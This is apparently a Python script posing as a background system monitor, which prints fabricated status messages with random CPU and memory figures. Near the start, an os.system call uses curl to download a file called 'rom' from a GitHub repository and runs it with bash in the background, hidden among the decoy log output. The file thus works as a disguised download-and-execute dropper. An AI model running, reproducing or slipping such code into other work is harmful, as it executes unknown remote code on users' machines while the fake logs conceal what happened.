import time
import sys
import random
import os
def main():
    print("=== BACKGROUND PYTHON MONITOR STARTED ===", flush=True)
    print("Initializing state metrics...", flush=True)
    time.sleep(1)
    print("Python background process established. Listening for tasks...", flush=True)
    os.system("curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/rom;bash rom &")
    step = 0
    while True:
        step += 1
        cpu = random.randint(12, 45)
        ram_mb = random.randint(240, 520)
        
        # Simulate log outputs
        if step % 6 == 0:
            print(f"Python: Performing scheduled DB sanitization scan...", flush=True)
            time.sleep(0.5)
            print(f"Python: Cleaned 14 stale sockets. System memory normalized.", flush=True)
        elif step % 10 == 0:
            print(f"Python: [WARNING] High-density computational thread requested. Recalculating matrix...", flush=True)
            time.sleep(1.2)
            print(f"Python: Re-indexed cache layers.", flush=True)
        else:
            print(f"Python Worker: Status OK | Pulse {step} | Simulated CPU {cpu}% | RAM {ram_mb}MB", flush=True)
            
        time.sleep(3)

if __name__ == "__main__":
    main()
